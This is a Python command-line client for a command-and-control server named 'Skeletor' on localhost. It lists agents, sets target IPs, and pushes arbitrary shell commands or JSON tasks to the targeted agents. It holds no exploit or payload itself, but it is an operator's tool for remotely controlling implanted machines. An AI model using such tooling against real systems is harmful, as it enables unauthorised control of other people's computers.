#!/usr/bin/env python3

import argparse
import requests
import json


def arg_setup():
    msg = "Command line tool for interaction with Skeletor C2 server running on localhost"
    parser = argparse.ArgumentParser(description = msg)
    subparsers = parser.add_subparsers(title="Verb", dest="verb", required=True)

    # 'get' command
    get_parser = subparsers.add_parser("get", help="Get resources")
    get_parser.add_argument("resource", help="Resource to retrieve", choices=['agents','targets'])
    get_parser.set_defaults(verb='get')
    # 'cmd' command
    cmd_parser = subparsers.add_parser("cmd", help="Command agents")
    cmd_parser.add_argument("cmd", help="Command to send to targeted agents")
    cmd_parser.set_defaults(verb='cmd')
    #clear command
    clear_parser = subparsers.add_parser("clear", help="Clear resources")
    clear_parser.add_argument("resource", help="Resource to clear", choices=['targets'])
    #post command
    post_parser = subparsers.add_parser("post", help="Post json file with task to targeted agents")
    post_parser.add_argument("json_file", help="Json file with task to post")
    #set targets
    set_parser = subparsers.add_parser("set", help="Set information")
    set_parser.add_argument("resource", help="Resource to set", choices=['targets'])
    set_parser.add_argument("ips", help="IPs to set as targets (entered as comma separated list)")


    
    return parser.parse_args()

def main():
    args = arg_setup()
    
    if args.verb == 'get':
        if args.resource == 'agents':
            agents = requests.get("http://localhost:80/get-agents").json()
            for agent in agents: 
                print(agent.get('agent_id') + " - " + agent.get('status'))
        elif args.resource == 'targets':
            targets = requests.get("http://localhost:80/targets").text.split("\n")
            for target in targets: 
                print(target)
        else:
            print("Invalid resource type for get command")
    elif args.verb == 'cmd':
        #print("cmd = " + args.cmd)
        for target in requests.get("http://localhost:80/targets").text.split("\n"):
            data = {'agent_id': target, 'action': 'command', 'command': args.cmd}
            requests.post("http://localhost:80/make-task", json=data)
    elif args.verb == 'clear':
        if args.resource == 'targets':
            requests.post("http://localhost:80/clear-targets")
        else:
            print("Invalid resource type for clear command")
    elif args.verb == 'post':
        json_data = json.load(open(args.json_file))
        targets = requests.get("http://localhost:80/targets").text.split("\n")
        for target in targets:
            json_data['agent_id'] = target
            requests.post("http://localhost:80/make-task", json=json_data)
    elif args.verb == 'set':
        if args.resource == 'targets':
            data = {"ips": args.ips}
            requests.post("http://localhost:80/set-targets", json=data)
        else:
            print("Invalid resource type for set command")
    else:
        print("Unknown verb")

if __name__ == '__main__':
    main()